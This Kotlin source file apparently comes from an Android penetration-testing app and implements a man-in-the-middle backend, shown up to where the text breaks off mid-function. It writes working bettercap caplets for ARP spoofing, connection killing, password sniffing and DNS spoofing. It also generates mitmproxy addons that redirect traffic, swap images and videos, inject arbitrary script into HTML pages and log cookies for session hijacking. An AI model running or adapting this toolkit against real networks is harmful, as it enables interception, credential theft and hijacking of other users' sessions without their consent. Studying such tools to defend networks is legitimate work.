package org.fsploit.android.data.mitm

import android.content.Context
import org.fsploit.android.R
import org.fsploit.android.core.ResourceProvider
import org.fsploit.android.data.settings.AppPreferencesRepository
import org.fsploit.android.data.shell.ShellRepository
import org.fsploit.android.domain.model.ConnectionBlockResult
import org.fsploit.android.domain.model.ConnectionBlockMode
import org.fsploit.android.domain.model.MitmActionResult
import org.fsploit.android.domain.model.MitmLaunchRequest
import org.fsploit.android.domain.model.MitmMode
import org.fsploit.android.domain.model.MitmReadiness
import org.fsploit.android.domain.model.MitmSession
import org.fsploit.android.domain.model.MitmToolchainConfig
import org.fsploit.android.domain.model.ShellStatus
import java.io.File
import java.net.Inet4Address
import java.net.InetAddress
import java.net.URL

class ExternalToolMitmBackend(
    context: Context,
    private val resourceProvider: ResourceProvider,
    private val shellRepository: ShellRepository,
    private val preferencesRepository: AppPreferencesRepository
) : MitmBackend {
    private val sessionStore = MitmSessionStore(context)
    private val blockStore = ConnectionBlockStore(context)
    private val toolchainProbe = ToolchainProbe(resourceProvider, shellRepository, preferencesRepository)

    override fun loadReadiness(shellStatus: ShellStatus): MitmReadiness {
        return toolchainProbe.loadReadiness(shellStatus)
    }

    override fun loadSession(): MitmSession {
        val record = sessionStore.loadRecord()
            ?: return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
        val active = record.pids.any(::isProcessAlive) || record.forwardDropTargetHost.isNotBlank()
        if (!active) {
            sessionStore.clear()
            return MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
        }
        return record.session
    }

    override fun startSession(request: MitmLaunchRequest): MitmActionResult {
        val targetHost = validateIpv4(request.targetHost)
            ?: return MitmActionResult(
                success = false,
                summary = resourceProvider.getString(R.string.block_invalid_host)
            )
        val interfaceName = request.interfaceName.trim()
        if (interfaceName.isEmpty()) {
            return MitmActionResult(
                success = false,
                summary = resourceProvider.getString(R.string.mitm_interface_required)
            )
        }
        val gatewayAddress = if (requiresGateway(request.mode, request.networkMode)) {
            validateIpv4(request.gatewayAddress)
                ?: return MitmActionResult(
                    success = false,
                    summary = resourceProvider.getString(R.string.mitm_gateway_required, interfaceName)
                )
        } else {
            ""
        }

        val readiness = loadReadiness(
            ShellStatus(
                shellAvailable = true,
                suAvailable = true,
                rootGranted = true,
                summary = ""
            )
        )
        val missingToolSummary = missingToolSummary(request.mode, request.networkMode, readiness)
        if (missingToolSummary != null) {
            return MitmActionResult(success = false, summary = missingToolSummary)
        }

        stopSession()

        val config = toolchainProbe.loadConfig()
        val startedAt = System.currentTimeMillis()
        val sessionDirectory = sessionStore.createSessionDirectory(startedAt)
        val mainLogFile = File(sessionDirectory, "bettercap.log")
        val pidList = mutableListOf<Long>()
        var artifactPath = ""
        var redirectPort = 0
        var forwardingEnabled = false
        var forwardDropTargetHost = ""

        try {
            when (request.mode) {
                MitmMode.CONNECTION_KILL -> startConnectionKill(
                    config = config,
                    networkMode = request.networkMode,
                    interfaceName = interfaceName,
                    targetHost = targetHost,
                    sessionDirectory = sessionDirectory,
                    logFile = mainLogFile,
                    pidList = pidList
                ).also { appliedForwardDrop ->
                    if (appliedForwardDrop) {
                        forwardDropTargetHost = targetHost
                    }
                }

                MitmMode.SNIFFER -> {
                    artifactPath = File(sessionDirectory, "capture.pcap").absolutePath
                    forwardingEnabled = true
                    startSniffer(
                        config = config,
                        networkMode = request.networkMode,
                        interfaceName = interfaceName,
                        targetHost = targetHost,
                        gatewayAddress = gatewayAddress,
                        artifactPath = artifactPath,
                        sessionDirectory = sessionDirectory,
                        logFile = mainLogFile,
                        pidList = pidList
                    )
                }

                MitmMode.PASSWORD_SNIFFER -> {
                    artifactPath = File(sessionDirectory, "credentials.log").absolutePath
                    forwardingEnabled = true
                    startPasswordSniffer(
                        config = config,
                        networkMode = request.networkMode,
                        interfaceName = interfaceName,
                        targetHost = targetHost,
                        gatewayAddress = gatewayAddress,
                        artifactPath = artifactPath,
                        sessionDirectory = sessionDirectory,
                        pidList = pidList
                    )
                }

                MitmMode.DNS_SPOOF -> {
                    artifactPath = File(sessionDirectory, "dns.spoof.hosts").absolutePath
                    forwardingEnabled = true
                    startDnsSpoof(
                        config = config,
                        networkMode = request.networkMode,
                        interfaceName = interfaceName,
                        targetHost = targetHost,
                        gatewayAddress = gatewayAddress,
                        dnsRules = request.payloadValue,
                        artifactPath = artifactPath,
                        sessionDirectory = sessionDirectory,
                        logFile = mainLogFile,
                        pidList = pidList
                    )
                }

                MitmMode.REDIRECT,
                MitmMode.IMAGE_REPLACE,
                MitmMode.VIDEO_REPLACE,
                MitmMode.SCRIPT_INJECTION,
                MitmMode.CUSTOM_FILTER,
                MitmMode.SESSION_HIJACK -> {
                    redirectPort = config.httpRedirectPort
                    forwardingEnabled = true
                    artifactPath = startHttpMitmMode(
                        request = request,
                        config = config,
                        networkMode = request.networkMode,
                        targetHost = targetHost,
                        interfaceName = interfaceName,
                        gatewayAddress = gatewayAddress,
                        redirectPort = redirectPort,
                        sessionDirectory = sessionDirectory,
                        logFile = mainLogFile,
                        pidList = pidList
                    )
                }
            }
        } catch (exception: IllegalArgumentException) {
            cleanupSession(pidList, redirectPort, forwardingEnabled, forwardDropTargetHost)
            return MitmActionResult(success = false, summary = exception.message.orEmpty())
        } catch (_: Exception) {
            cleanupSession(pidList, redirectPort, forwardingEnabled, forwardDropTargetHost)
            return MitmActionResult(
                success = false,
                summary = resourceProvider.getString(R.string.mitm_session_start_failed)
            )
        }

        val session = MitmSession(
            active = true,
            mode = request.mode,
            targetHost = targetHost,
            interfaceName = interfaceName,
            summary = resourceProvider.getString(
                R.string.mitm_session_running,
                resourceProvider.getString(request.mode.titleRes),
                targetHost
            ),
            logPath = mainLogFile.absolutePath,
            artifactPath = artifactPath,
            startedAtEpochMs = startedAt
        )
        sessionStore.saveRecord(
            ActiveMitmSessionRecord(
                session = session,
                pids = pidList,
                redirectPort = redirectPort,
                forwardingEnabled = forwardingEnabled,
                forwardDropTargetHost = forwardDropTargetHost
            )
        )

        return MitmActionResult(
            success = true,
            summary = session.summary,
            session = session
        )
    }

    override fun stopSession(): MitmActionResult {
        val record = sessionStore.loadRecord()
            ?: return MitmActionResult(
                success = true,
                summary = resourceProvider.getString(R.string.mitm_session_idle),
                session = MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
            )

        cleanupSession(
            record.pids,
            record.redirectPort,
            record.forwardingEnabled,
            record.forwardDropTargetHost
        )
        sessionStore.clear()

        return MitmActionResult(
            success = true,
            summary = resourceProvider.getString(R.string.mitm_session_stopped),
            session = MitmSession(summary = resourceProvider.getString(R.string.mitm_session_idle))
        )
    }

    override fun blockHost(
        targetHost: String,
        interfaceName: String,
        mode: ConnectionBlockMode
    ): ConnectionBlockResult {
        if (interfaceName.isBlank()) {
            return ConnectionBlockResult(
                targetHost = targetHost,
                success = false,
                summary = resourceProvider.getString(R.string.mitm_interface_required)
            )
        }

        val readiness = loadReadiness(
            ShellStatus(
                shellAvailable = true,
                suAvailable = true,
                rootGranted = true,
                summary = ""
            )
        )
        stopConnectionBlockInternal()
        val startedAt = System.currentTimeMillis()
        val blockDirectory = blockStore.createBlockDirectory(startedAt)
        val logFile = File(blockDirectory, "connection_block.log")
        val record = when (mode) {
            ConnectionBlockMode.NORMAL -> {
                if (!readiness.bettercapAvailable) {
                    return ConnectionBlockResult(
                        targetHost = targetHost,
                        success = false,
                        summary = resourceProvider.getString(R.string.mitm_missing_bettercap)
                    )
                }
                val config = toolchainProbe.loadConfig()
                val pid = startBettercapCaplet(
                    config = config,
                    name = "connection_block",
                    interfaceName = interfaceName,
                    sessionDirectory = blockDirectory,
                    logFile = logFile,
                    capletContent = buildArpBanCaplet(targetHost)
                ) ?: return ConnectionBlockResult(
                    targetHost = targetHost,
                    success = false,
                    summary = resourceProvider.getString(R.string.mitm_session_start_failed)
                )
                ActiveConnectionBlockRecord(
                    targetHost = targetHost,
                    interfaceName = interfaceName,
                    mode = mode,
                    pid = pid,
                    logPath = logFile.absolutePath,
                    startedAtEpochMs = startedAt
                )
            }

            ConnectionBlockMode.HOTSPOT -> {
                if (!readiness.iptablesAvailable) {
                    return ConnectionBlockResult(
                        targetHost = targetHost,
                        success = false,
                        summary = resourceProvider.getString(R.string.mitm_missing_iptables)
                    )
                }
                if (!applyForwardDrop(targetHost)) {
                    return ConnectionBlockResult(
                        targetHost = targetHost,
                        success = false,
                        summary = resourceProvider.getString(R.string.block_failed, targetHost, "iptables FORWARD")
                    )
                }
                logFile.writeText("FORWARD DROP active for $targetHost on $interfaceName\n")
                ActiveConnectionBlockRecord(
                    targetHost = targetHost,
                    interfaceName = interfaceName,
                    mode = mode,
                    pid = null,
                    logPath = logFile.absolutePath,
                    startedAtEpochMs = startedAt
                )
            }
        }

        blockStore.saveRecord(
            record
        )

        return ConnectionBlockResult(
            targetHost = targetHost,
            success = true,
            summary = resourceProvider.getString(R.string.block_applied, targetHost)
        )
    }

    override fun unblockHost(hostAddress: String): ConnectionBlockResult {
        val record = loadConnectionBlockRecord()
            ?: return ConnectionBlockResult(
                targetHost = hostAddress,
                success = true,
                summary = resourceProvider.getString(R.string.block_removed, hostAddress)
            )

        stopConnectionBlockInternal()
        return ConnectionBlockResult(
            targetHost = record.targetHost,
            success = true,
            summary = resourceProvider.getString(R.string.block_removed, record.targetHost)
        )
    }

    private fun startConnectionKill(
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        sessionDirectory: File,
        logFile: File,
        pidList: MutableList<Long>
    ): Boolean {
        return when (networkMode) {
            ConnectionBlockMode.NORMAL -> {
                val pid = startBettercapCaplet(
                    config = config,
                    name = "connection_kill",
                    interfaceName = interfaceName,
                    sessionDirectory = sessionDirectory,
                    logFile = logFile,
                    capletContent = buildArpBanCaplet(targetHost)
                ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
                pidList += pid
                false
            }

            ConnectionBlockMode.HOTSPOT -> {
                if (!applyForwardDrop(targetHost)) {
                    throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
                }
                logFile.writeText("FORWARD DROP active for $targetHost on $interfaceName\n")
                true
            }
        }
    }

    private fun startSniffer(
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        gatewayAddress: String,
        artifactPath: String,
        sessionDirectory: File,
        logFile: File,
        pidList: MutableList<Long>
    ) {
        setForwarding(true)
        val bettercapPid = if (networkMode == ConnectionBlockMode.NORMAL) {
            startBettercapCaplet(
                config = config,
                name = "spoof_relay",
                interfaceName = interfaceName,
                sessionDirectory = sessionDirectory,
                logFile = logFile,
                capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
            ).also { it?.let(pidList::add) }
        } else {
            null
        }
        val tcpdumpPid = startDetachedProcess(
            name = "tcpdump_capture",
            sessionDirectory = sessionDirectory,
            logFile = File(artifactPath),
            body = buildTcpdumpScript(config, interfaceName, targetHost, artifactPath)
        )
        tcpdumpPid?.let(pidList::add)
        if ((networkMode == ConnectionBlockMode.NORMAL && bettercapPid == null) || tcpdumpPid == null) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        }
    }

    private fun startPasswordSniffer(
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        gatewayAddress: String,
        artifactPath: String,
        sessionDirectory: File,
        pidList: MutableList<Long>
    ) {
        setForwarding(true)
        val bettercapPid = startBettercapCaplet(
            config = config,
            name = "password_sniff",
            interfaceName = interfaceName,
            sessionDirectory = sessionDirectory,
            logFile = File(artifactPath),
            capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
                buildPasswordSniffCaplet(targetHost, gatewayAddress)
            } else {
                buildHotspotPasswordSniffCaplet(targetHost)
            }
        )
        bettercapPid?.let(pidList::add)
        if (bettercapPid == null) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        }
    }

    private fun startDnsSpoof(
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        interfaceName: String,
        targetHost: String,
        gatewayAddress: String,
        dnsRules: String,
        artifactPath: String,
        sessionDirectory: File,
        logFile: File,
        pidList: MutableList<Long>
    ) {
        if (dnsRules.trim().isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_dns_rules_required))
        }
        File(artifactPath).writeText(normalizeBettercapDnsRules(dnsRules))
        setForwarding(true)
        val bettercapPid = startBettercapCaplet(
            config = config,
            name = "dns_spoof",
            interfaceName = interfaceName,
            sessionDirectory = sessionDirectory,
            logFile = logFile,
            capletContent = if (networkMode == ConnectionBlockMode.NORMAL) {
                buildDnsSpoofCaplet(targetHost, gatewayAddress, artifactPath)
            } else {
                buildHotspotDnsSpoofCaplet(targetHost, artifactPath)
            }
        )
        bettercapPid?.let(pidList::add)
        if (bettercapPid == null) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        }
    }

    private fun startHttpMitmMode(
        request: MitmLaunchRequest,
        config: MitmToolchainConfig,
        networkMode: ConnectionBlockMode,
        targetHost: String,
        interfaceName: String,
        gatewayAddress: String,
        redirectPort: Int,
        sessionDirectory: File,
        logFile: File,
        pidList: MutableList<Long>
    ): String {
        val addonFile = File(sessionDirectory, "mitm_addon.py")
        val artifactPath = if (request.mode == MitmMode.SESSION_HIJACK) {
            File(sessionDirectory, "cookies.jsonl").absolutePath
        } else {
            addonFile.absolutePath
        }
        addonFile.writeText(buildMitmdumpAddon(request, artifactPath))

        val mitmdumpPid = startDetachedProcess(
            name = "mitmdump_http",
            sessionDirectory = sessionDirectory,
            logFile = logFile,
            body = buildMitmdumpScript(config, addonFile, redirectPort)
        ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
        pidList += mitmdumpPid

        setForwarding(true)
        applyPortRedirect(redirectPort)
        if (networkMode == ConnectionBlockMode.NORMAL) {
            val bettercapPid = startBettercapCaplet(
                config = config,
                name = "http_relay",
                interfaceName = interfaceName,
                sessionDirectory = sessionDirectory,
                logFile = logFile,
                capletContent = buildArpSpoofCaplet(targetHost, gatewayAddress)
            ) ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
            pidList += bettercapPid
        }
        return artifactPath
    }

    private fun cleanupSession(
        pids: List<Long>,
        redirectPort: Int,
        forwardingEnabled: Boolean,
        forwardDropTargetHost: String
    ) {
        pids.forEach { pid ->
            shellRepository.execute(
                command = "kill -15 $pid 2>/dev/null || true; sleep 1; kill -0 $pid 2>/dev/null && kill -9 $pid 2>/dev/null || true",
                asRoot = true,
                timeoutMs = PROBE_TIMEOUT_MS
            )
        }
        if (redirectPort > 0) {
            shellRepository.execute(
                command = "while iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports $redirectPort 2>/dev/null; do :; done",
                asRoot = true,
                timeoutMs = FIREWALL_TIMEOUT_MS
            )
        }
        if (forwardingEnabled) {
            setForwarding(false)
        }
        if (forwardDropTargetHost.isNotBlank()) {
            clearForwardDrop(forwardDropTargetHost)
        }
    }

    private fun loadConnectionBlockRecord(): ActiveConnectionBlockRecord? {
        val record = blockStore.loadRecord() ?: return null
        if (record.mode == ConnectionBlockMode.NORMAL && record.pid != null && !isProcessAlive(record.pid)) {
            blockStore.clear()
            return null
        }
        return record
    }

    private fun stopConnectionBlockInternal() {
        val record = blockStore.loadRecord() ?: return
        when (record.mode) {
            ConnectionBlockMode.NORMAL -> {
                val pid = record.pid
                if (pid != null) {
                    shellRepository.execute(
                        command = "kill -15 $pid 2>/dev/null || true; sleep 1; kill -0 $pid 2>/dev/null && kill -9 $pid 2>/dev/null || true",
                        asRoot = true,
                        timeoutMs = PROBE_TIMEOUT_MS
                    )
                }
            }

            ConnectionBlockMode.HOTSPOT -> clearForwardDrop(record.targetHost)
        }
        blockStore.clear()
    }

    private fun applyForwardDrop(targetHost: String): Boolean {
        val result = shellRepository.execute(
            command = buildString {
                append("iptables -C FORWARD -s ")
                append(targetHost)
                append(" -j DROP 2>/dev/null || iptables -I FORWARD -s ")
                append(targetHost)
                append(" -j DROP\n")
                append("iptables -C FORWARD -d ")
                append(targetHost)
                append(" -j DROP 2>/dev/null || iptables -I FORWARD -d ")
                append(targetHost)
                append(" -j DROP\n")
            },
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )
        return result.exitCode == 0 && !result.timedOut
    }

    private fun clearForwardDrop(targetHost: String) {
        shellRepository.execute(
            command = buildString {
                append("while iptables -D FORWARD -s ")
                append(targetHost)
                append(" -j DROP 2>/dev/null; do :; done\n")
                append("while iptables -D FORWARD -d ")
                append(targetHost)
                append(" -j DROP 2>/dev/null; do :; done\n")
            },
            asRoot = true,
            timeoutMs = FIREWALL_TIMEOUT_MS
        )
    }

    private fun missingToolSummary(
        mode: MitmMode,
        networkMode: ConnectionBlockMode,
        readiness: MitmReadiness
    ): String? {
        return when (mode) {
            MitmMode.CONNECTION_KILL ->
                when (networkMode) {
                    ConnectionBlockMode.NORMAL ->
                        if (!readiness.bettercapAvailable) resourceProvider.getString(R.string.mitm_missing_bettercap) else null
                    ConnectionBlockMode.HOTSPOT ->
                        if (!readiness.iptablesAvailable) resourceProvider.getString(R.string.mitm_missing_iptables) else null
                }

            MitmMode.SNIFFER ->
                when {
                    !readiness.tcpdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_tcpdump)
                    networkMode == ConnectionBlockMode.NORMAL && !readiness.bettercapAvailable ->
                        resourceProvider.getString(R.string.mitm_missing_bettercap)
                    else -> null
                }

            MitmMode.PASSWORD_SNIFFER,
            MitmMode.DNS_SPOOF ->
                if (!readiness.bettercapAvailable) {
                    resourceProvider.getString(R.string.mitm_missing_bettercap)
                } else {
                    null
                }

            MitmMode.REDIRECT,
            MitmMode.IMAGE_REPLACE,
            MitmMode.VIDEO_REPLACE,
            MitmMode.SCRIPT_INJECTION,
            MitmMode.CUSTOM_FILTER,
            MitmMode.SESSION_HIJACK ->
                when {
                    !readiness.iptablesAvailable -> resourceProvider.getString(R.string.mitm_missing_iptables)
                    !readiness.mitmdumpAvailable -> resourceProvider.getString(R.string.mitm_missing_mitmdump)
                    networkMode == ConnectionBlockMode.NORMAL && !readiness.bettercapAvailable ->
                        resourceProvider.getString(R.string.mitm_missing_bettercap)
                    else -> null
                }
        }
    }

    private fun startBettercapCaplet(
        config: MitmToolchainConfig,
        name: String,
        interfaceName: String,
        sessionDirectory: File,
        logFile: File,
        capletContent: String
    ): Long? {
        val capletFile = File(sessionDirectory, "$name.cap")
        capletFile.writeText(capletContent)
        return startDetachedProcess(
            name = name,
            sessionDirectory = sessionDirectory,
            logFile = logFile,
            body = buildBettercapScript(config, interfaceName, capletFile)
        )
    }

    private fun buildBettercapScript(
        config: MitmToolchainConfig,
        interfaceName: String,
        capletFile: File
    ): String {
        val bettercapPath = config.bettercapPath.trim()
        if (bettercapPath.contains('/')) {
            val sourceBinary = File(bettercapPath)
            val sourceDirectory = sourceBinary.parentFile
                ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_session_start_failed))
            val sourceLibusb = File(sourceDirectory, "libusb1.0.so")
            val sourceCompatLibusb = File(sourceDirectory, "libusb-1.0.so")
            return buildString {
                append("set -e\n")
                append("runtime_dir=")
                append(shellQuote("$BETTERCAP_RUNTIME_DIRECTORY_PREFIX-$$"))
                append('\n')
                append("rm -rf \"${'$'}runtime_dir\"\n")
                append("mkdir -p \"${'$'}runtime_dir\"\n")
                append("cp ")
                append(shellQuote(sourceBinary.absolutePath))
                append(" \"${'$'}runtime_dir/bettercap\"\n")
                append("if [ -f ")
                append(shellQuote(sourceLibusb.absolutePath))
                append(" ]; then cp ")
                append(shellQuote(sourceLibusb.absolutePath))
                append(" \"${'$'}runtime_dir/libusb1.0.so\"; fi\n")
                append("if [ -f ")
                append(shellQuote(sourceCompatLibusb.absolutePath))
                append(" ]; then cp ")
                append(shellQuote(sourceCompatLibusb.absolutePath))
                append(" \"${'$'}runtime_dir/libusb-1.0.so\"; fi\n")
                append("if [ ! -f \"${'$'}runtime_dir/libusb-1.0.so\" ] && [ -f \"${'$'}runtime_dir/libusb1.0.so\" ]; then cp \"${'$'}runtime_dir/libusb1.0.so\" \"${'$'}runtime_dir/libusb-1.0.so\"; fi\n")
                append("chmod 755 \"${'$'}runtime_dir/bettercap\"\n")
                append("if [ -f \"${'$'}runtime_dir/libusb1.0.so\" ]; then chmod 755 \"${'$'}runtime_dir/libusb1.0.so\"; fi\n")
                append("if [ -f \"${'$'}runtime_dir/libusb-1.0.so\" ]; then chmod 755 \"${'$'}runtime_dir/libusb-1.0.so\"; fi\n")
                append("cd \"${'$'}runtime_dir\" || exit 1\n")
                append("export LD_LIBRARY_PATH=\"${'$'}runtime_dir:${'$'}{LD_LIBRARY_PATH}\"\n")
                append("exec ")
                append("\"${'$'}runtime_dir/bettercap\"")
                append(" -iface ")
                append(shellQuote(interfaceName))
                append(" -no-colors -caplet ")
                append(shellQuote(capletFile.absolutePath))
                append('\n')
            }
        }
        return buildString {
            append("exec ")
            append(shellCommandToken(bettercapPath))
            append(" -iface ")
            append(shellQuote(interfaceName))
            append(" -no-colors -caplet ")
            append(shellQuote(capletFile.absolutePath))
            append('\n')
        }
    }

    private fun buildArpBanCaplet(targetHost: String): String {
        return """
set events.stream.output stdout
set arp.spoof.targets $targetHost
arp.ban on
sleep 31536000
""".trimIndent()
    }

    private fun buildArpSpoofCaplet(targetHost: String, gatewayAddress: String): String {
        return """
set events.stream.output stdout
set gateway.address $gatewayAddress
set arp.spoof.fullduplex true
set arp.spoof.targets $targetHost
arp.spoof on
sleep 31536000
""".trimIndent()
    }

    private fun buildPasswordSniffCaplet(targetHost: String, gatewayAddress: String): String {
        return """
set events.stream.output stdout
set gateway.address $gatewayAddress
set arp.spoof.fullduplex true
set arp.spoof.targets $targetHost
arp.spoof on
set net.sniff.local false
set net.sniff.verbose false
set net.sniff.filter "host $targetHost and not arp"
net.sniff on
sleep 31536000
""".trimIndent()
    }

    private fun buildHotspotPasswordSniffCaplet(targetHost: String): String {
        return """
set events.stream.output stdout
set net.sniff.local false
set net.sniff.verbose false
set net.sniff.filter "host $targetHost and not arp"
net.sniff on
sleep 31536000
""".trimIndent()
    }

    private fun buildDnsSpoofCaplet(targetHost: String, gatewayAddress: String, hostsFilePath: String): String {
        return """
set events.stream.output stdout
set gateway.address $gatewayAddress
set arp.spoof.fullduplex true
set arp.spoof.targets $targetHost
arp.spoof on
set dns.spoof.all false
set dns.spoof.hosts ${hostsFilePath}
dns.spoof on
sleep 31536000
""".trimIndent()
    }

    private fun buildHotspotDnsSpoofCaplet(targetHost: String, hostsFilePath: String): String {
        return """
set events.stream.output stdout
set net.sniff.local false
set net.sniff.filter "host $targetHost and not arp"
set dns.spoof.all false
set dns.spoof.hosts ${hostsFilePath}
dns.spoof on
sleep 31536000
""".trimIndent()
    }

    private fun requiresGateway(mode: MitmMode, networkMode: ConnectionBlockMode): Boolean {
        if (networkMode == ConnectionBlockMode.HOTSPOT) {
            return false
        }
        return when (mode) {
            MitmMode.CONNECTION_KILL -> false
            MitmMode.SNIFFER,
            MitmMode.PASSWORD_SNIFFER,
            MitmMode.DNS_SPOOF,
            MitmMode.REDIRECT,
            MitmMode.IMAGE_REPLACE,
            MitmMode.VIDEO_REPLACE,
            MitmMode.SCRIPT_INJECTION,
            MitmMode.CUSTOM_FILTER,
            MitmMode.SESSION_HIJACK -> true
        }
    }

    private fun buildTcpdumpScript(
        config: MitmToolchainConfig,
        interfaceName: String,
        targetHost: String,
        artifactPath: String
    ): String {
        return "exec ${shellCommandToken(config.tcpdumpPath)} -i ${shellQuote(interfaceName)} -n -s 0 host ${shellQuote(targetHost)} and not arp -w ${shellQuote(artifactPath)}\n"
    }

    private fun buildMitmdumpScript(
        config: MitmToolchainConfig,
        addonFile: File,
        redirectPort: Int
    ): String {
        val mitmdumpPath = config.mitmdumpPath.trim()
        if (mitmdumpPath.contains('/')) {
            val sourceBinary = File(mitmdumpPath)
            val binDirectory = sourceBinary.parentFile
            val bundleRoot = binDirectory?.parentFile
            if (binDirectory?.name == "bin" && bundleRoot != null && File(bundleRoot, "python").isDirectory) {
                return buildManagedMitmdumpScript(bundleRoot, addonFile, redirectPort)
            }
        }
        return buildString {
            append("exec ")
            append(shellCommandToken(mitmdumpPath))
            append(" --mode transparent --showhost ")
            append("--set block_global=false ")
            append("--listen-host 0.0.0.0 ")
            append("--listen-port ")
            append(redirectPort)
            append(" -s ")
            append(shellQuote(addonFile.absolutePath))
            append('\n')
        }
    }

    private fun buildManagedMitmdumpScript(
        bundleRoot: File,
        addonFile: File,
        redirectPort: Int
    ): String {
        return buildString {
            append("set -e\n")
            append("runtime_dir=")
            append(shellQuote("$MITMDUMP_RUNTIME_DIRECTORY_PREFIX-$$"))
            append('\n')
            append("rm -rf \"${'$'}runtime_dir\"\n")
            append("mkdir -p \"${'$'}runtime_dir\"\n")
            append("cp -R ")
            append(shellQuote("${bundleRoot.absolutePath}/."))
            append(" \"${'$'}runtime_dir\"\n")
            append("find \"${'$'}runtime_dir\" -type d -exec chmod 755 {} \\;\n")
            append("if [ -f \"${'$'}runtime_dir/bin/mitmdump\" ]; then chmod 755 \"${'$'}runtime_dir/bin/mitmdump\"; fi\n")
            append("if [ -f \"${'$'}runtime_dir/python/bin/python3\" ]; then chmod 755 \"${'$'}runtime_dir/python/bin/python3\"; fi\n")
            append("find \"${'$'}runtime_dir\" -type f -name '*.so' -exec chmod 755 {} \\; 2>/dev/null || true\n")
            append("cd \"${'$'}runtime_dir\" || exit 1\n")
            append("exec ")
            append("\"${'$'}runtime_dir/bin/mitmdump\"")
            append(" --mode transparent --showhost ")
            append("--set block_global=false ")
            append("--listen-host 0.0.0.0 ")
            append("--listen-port ")
            append(redirectPort)
            append(" -s ")
            append(shellQuote(addonFile.absolutePath))
            append('\n')
        }
    }

    private fun buildMitmdumpAddon(request: MitmLaunchRequest, artifactPath: String): String {
        return when (request.mode) {
            MitmMode.REDIRECT -> buildRedirectAddon(request)
            MitmMode.IMAGE_REPLACE -> buildImageReplaceAddon(request)
            MitmMode.VIDEO_REPLACE -> buildVideoReplaceAddon(request)
            MitmMode.SCRIPT_INJECTION -> buildScriptInjectionAddon(request)
            MitmMode.CUSTOM_FILTER -> buildCustomFilterAddon(request)
            MitmMode.SESSION_HIJACK -> buildSessionHijackAddon(artifactPath)
            else -> throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_mode_not_supported))
        }
    }

    private fun buildRedirectAddon(request: MitmLaunchRequest): String {
        val targetHost = normalizeHostInput(request.primaryValue)
        val targetPort = request.secondaryValue.trim().toIntOrNull()
            ?.takeIf { it in 1..65535 }
            ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_redirect_port_invalid))
        return """
from mitmproxy import http

TARGET_HOST = ${pythonLiteral(targetHost)}
TARGET_PORT = $targetPort

def request(flow: http.HTTPFlow) -> None:
    flow.request.scheme = "http"
    flow.request.host = TARGET_HOST
    flow.request.port = TARGET_PORT
    flow.request.headers["Host"] = TARGET_HOST
""".trimIndent()
    }

    private fun buildImageReplaceAddon(request: MitmLaunchRequest): String {
        val resourceUrl = normalizeUrlInput(request.primaryValue)
        return """
import re
from mitmproxy import http

RESOURCE = ${pythonLiteral(resourceUrl)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "text/css" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    data = re.sub(r'(?i)<img([^/]+)src=(["\'])[^"\']+(["\'])', r'<img\1src=\2' + RESOURCE + r'\3', data)
    data = re.sub(r'(?i)background\s*(:|-)\s*url\s*[\(|:][^\);]+\)?.*', 'background: url(' + RESOURCE + ')', data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildVideoReplaceAddon(request: MitmLaunchRequest): String {
        val videoId = extractYoutubeVideoId(request.primaryValue.trim())
            ?: throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_video_url_invalid))
        return """
import re
from mitmproxy import http

VIDEO_ID = ${pythonLiteral(videoId)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type and "javascript" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    data = re.sub(r'(?s)/v=[a-zA-Z0-9_-]+', '/v=' + VIDEO_ID, data)
    data = re.sub(r'(?s)/v/[a-zA-Z0-9_-]+', '/v/' + VIDEO_ID, data)
    data = re.sub(r'(?s)/embed/[a-zA-Z0-9_-]+', '/embed/' + VIDEO_ID, data)
    flow.response.set_text(data)
""".trimIndent()
    }

    private fun buildScriptInjectionAddon(request: MitmLaunchRequest): String {
        val payload = request.payloadValue.trim()
        if (payload.isEmpty()) {
            throw IllegalArgumentException(resourceProvider.getString(R.string.mitm_script_required))
        }
        return """
import re
from mitmproxy import http

INJECTION = ${pythonLiteral(payload)}

def response(flow: http.HTTPFlow) -> None:
    content_type = flow.response.headers.get("content-type", "")
    if "text/html" not in content_type:
        return
    try:
        data = flow.response.get_text(strict=False)
    except Exception:
        return
    updated = re.sub(r'(?i)</head>', INJECTION + '</head>', data, count=1)
    if updated == data:
        updated = INJECTION + data
    flow.response.set_text(updated)
""".trimIndent()
    }

    private fun buildCustomFilterAddon(request: MitmLaunchRequest): String {
        val rules = request.payloadValue.lines()
            .map { it.trim() }
            .filter { it.isNotEmpty() }
            .map { line ->
                val separator = line.indexOf("=>")
                if (separator <= 0 || separator >= line.lastIndex) {
